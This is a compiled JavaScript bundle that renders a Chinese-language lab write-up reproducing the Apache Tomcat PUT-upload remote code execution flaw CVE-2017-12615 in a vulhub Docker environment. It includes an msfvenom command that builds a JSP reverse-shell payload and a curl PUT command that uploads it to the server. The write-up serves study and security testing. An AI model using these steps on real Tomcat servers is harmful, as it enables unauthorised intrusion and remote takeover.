(window.webpackJsonp=window.webpackJsonp||[]).push([[200],{2161:function(s,a,e){s.exports=e.p+"assets/img/291a35c3-469d-48b6-a65d-92270dfe6024.eeb98650.png"},2162:function(s,a,e){s.exports=e.p+"assets/img/a963d85c-3514-490e-905f-1b6193c75adf.e2ae8cb4.png"},2652:function(s,a,e){"use strict";e.r(a);var t=e(75),r=Object(t.a)({},(function(){var s=this,a=s.$createElement,t=s._self._c||a;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"apache-tomcat-远程代码执行漏洞-cve-2017-12615"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#apache-tomcat-远程代码执行漏洞-cve-2017-12615"}},[s._v("#")]),s._v(" Apache Tomcat 远程代码执行漏洞 CVE-2017-12615")]),s._v(" "),t("h2",{attrs:{id:"漏洞描述"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),t("p",[s._v("2017年9月19日，Apache Tomcat官方确认并修复了两个高危漏洞，其中就有远程代码执行漏洞(CVE-2017-12615)。当 启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。")]),s._v(" "),t("h2",{attrs:{id:"影响版本"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#影响版本"}},[s._v("#")]),s._v(" 影响版本")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("Apache Tomcat 7.0.0 - 7.0.81")]),t("br"),s._v(" "),t("h2",{attrs:{id:"环境搭建"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[s._v("#")]),s._v(" 环境搭建")]),s._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("git")]),s._v(" clone https://github.com/vulhub/vulhub.git\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" vulhub/tomcat/CVE-2017-12615\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("docker-compose")]),s._v(" up -d\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("p",[t("img",{attrs:{src:e(758),alt:"cbe1eedd-5a2a-4147-b44c-d2789769015f"}})]),s._v(" "),t("h2",{attrs:{id:"漏洞复现"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),t("p",[s._v("漏洞产生的主要原因来自于"),t("code",[s._v("conf/web.xml")]),s._v("文件配置错误,readonly开启了false,导致可以使用"),t("code",[s._v("PUT/DELETE")]),s._v("请求方法操作文件")]),s._v(" "),t("p",[t("img",{attrs:{src:e(2161),alt:"291a35c3-469d-48b6-a65d-92270dfe6024"}})]),s._v(" "),t("p",[t("code",[s._v("msf")]),s._v("生成一个"),t("code",[s._v("jsp")]),s._v("木马")]),s._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[s._v("msfvenom -p java/jsp_shell_reverse_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("xxx.xxx.xxx.xxx "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("9999")]),s._v(" -f raw "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" shell.jsp\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("利用PUT方法上传木马")]),s._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" -v -X PUT --data-binary @shell.jsp "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"http://xxx.xxx.xxx.xxx:8080/shell.jsp/"')]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("a-alert",{attrs:{type:"success",message:'注意 http://xxx.xxx.xxx.xxx:8080/shell.jsp/中的最后一个"/"字符很重要',description:"",showIcon:""}}),s._v(" "),t("br"),s._v(" "),t("p",[s._v("成功上传木马文件")]),s._v(" "),t("p",[t("img",{attrs:{src:e(2162),alt:"a963d85c-3514-490e-905f-1b6193c75adf"}})]),s._v(" "),t("p",[s._v("访问文件即可反弹一个"),t("code",[s._v("shell")])])],1)}),[],!1,null,null,null);a.default=r.exports},758:function(s,a,e){s.exports=e.p+"assets/img/cbe1eedd-5a2a-4147-b44c-d2789769015f.71f76f8f.png"}}]);